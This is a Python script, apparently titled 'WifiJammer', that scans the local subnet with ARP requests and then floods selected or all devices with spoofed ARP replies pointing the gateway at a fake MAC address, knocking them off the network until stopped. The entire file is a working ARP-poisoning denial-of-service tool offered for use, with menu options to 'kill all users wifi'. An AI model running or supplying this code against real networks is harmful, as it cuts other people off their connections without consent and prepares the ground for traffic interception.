import scapy.all as scapy
import time , sys
import requests as r
import socket , json
def devices_restore():
      file=open('devices.txt', 'r+',encoding='utf-8')
      ipmacss = file.read().replace("'", '').replace('[', '').replace(']', '').replace(' ', '')
      lista = ipmacss.split(',')
      macs = lista[1::2]
      ips = lista[0::2]
      for i in ips:
          iplist.append(i)
      for x in macs:
          maclist.append(x)
def ip_mac_scanner(ip):
   arp_packet = scapy.ARP(pdst=ip)
   broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
   try:
     answered_list = scapy.srp(broadcast_packet / arp_packet,verbose=False,timeout=0.25)[0]
     user_ip_mac = [answered_list[0][1].psrc, answered_list[0][1].hwsrc]
     return user_ip_mac
   except:
     pass

def get_lan_ip():
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.connect(('8.8.8.8', 80))
  ip = s.getsockname()
  s.close()
  return ip[0]

def scanning():
    print('\nRefreshing please wait...')
    count = 1
    for x,y in network_scanner(ip_range):
            iplist.append(x)
            maclist.append(y)
            devices.append(x)
            devices.append(y)
            count+=1

def network_scanner(ip_range):
  count = 0
  network_list=[]
  while True:
    count += 1
    current_ip=ip_mac_scanner(ip_range+"%s" % str(count))
    if current_ip is not None:
      network_list.append(current_ip)
    if count == 255:
      break
  return network_list

def mac_lookup(mac):
    txt=r.get("https://macvendors.co/api/%s"%mac).text
    x=json.loads(txt)
    return x['result']['company']

def poisoning(gateway_ip,victim_ip,victim_mac):
   packet = scapy.ARP(op=2, psrc=gateway_ip, hwsrc='12:34:56:78:9A:BC', pdst=victim_ip, hwdst=victim_mac)
   scapy.send(packet, verbose=0)

def print_div(lenn):
    print('-'*(lenn+50))

def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
  packet = scapy.ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=victim_ip, hwdst=victim_mac)
  scapy.send(packet, verbose=0)

def killemall():
    ip_mac_table()
    try:
      print("\nDone! all the current users are being poisoned ...(Let the script running if you want to continue poisoning)")
      print("Otherwise press Ctrl+C to stop")
      while True:
        for i in range(len(iplist)):
           poisoning(gate,iplist[i],maclist[i])
        time.sleep(10)
    except KeyboardInterrupt:
        for i in range(len(iplist)):
           restore(iplist[i],maclist[i],gate,ip_mac_scanner(gate)[1])
def ip_mac_table():
    table = "\tIP\t\tMAC\t\t\tManufacturing"
    print(table)
    print_div(len(table))
    list = []
    count = 0
    for i in range(len(iplist)):
       list.append([iplist[count], maclist[count]])
       count += 1
    count = 0
    for x, y in list:
       count += 1
       print(str(count) + ".\t" + x + '\t' + y + '\t'+mac_lookup(y)+'\n')
def selective():
    ip_mac_table()
    try:
        co=0
        while True:
          co+=1
          if co == 1:
             print('\nSelect a number or multiple numbers seperated by , ')
          inp=input(': ')
          if len(inp) == 1:
              break
          if "," not in inp:
              print("\nMake sure you included a comma ',' between each number")
              continue
          else:
              break
        choices=inp.split(',')
        print('\nDone all the users chosen are being poisoned...(Let the script running if you want to continue poisoning)')
        print("Otherwise press Ctrl+C to stop")
        while True:
           for i in choices:
             victimip=iplist[int(i)-1]
             victimmac=maclist[int(i)-1]
             poisoning(gate,victimip,victimmac)
           time.sleep(10)
    except KeyboardInterrupt:
        for i in choices:
            victimip = iplist[int(i) - 1]
            victimmac = maclist[int(i) - 1]
            restore(victimip,victimmac,gate,ip_mac_scanner(gate)[1])
    except ValueError:
        print("Please make sure you typed in a correct number ")
        sys.exit(0)
print('Welecome to WifiJammer\n\n1.Choose specified users\n2.Kill all users wifi\n3.Load the saved devices and choose from em\n4.Load The saved devices and kill em all\n')
own_ip=get_lan_ip().split('.')
ip_first= get_lan_ip().split('.')
ip_first.pop(-1)
ip_range='.'.join(ip_first)+"."
gate=ip_range+"1"
iplist=[]
maclist=[]
devices=[]

options = input("Choose an option: ")

if options=="1":
    scanning()
    selective()
    save_inp = input('Would you like to save this list of devices[y/n]')
    if save_inp in 'Yy':
        with open('devices.txt', 'w+') as file:
            file.write(str(devices))
    else:
        pass
elif options=="2":
    scanning()
    killemall()
    save_inp = input('Would you like to save this list of devices[y/n]')
    if save_inp in 'Yy':
        with open('devices.txt', 'w+') as file:
            file.write(str(devices))
    else:
        pass
elif options=="4":
    devices_restore()
    killemall()
elif options == "3":
    devices_restore()
    selective()
else:
    print("Wrong choice Try again")


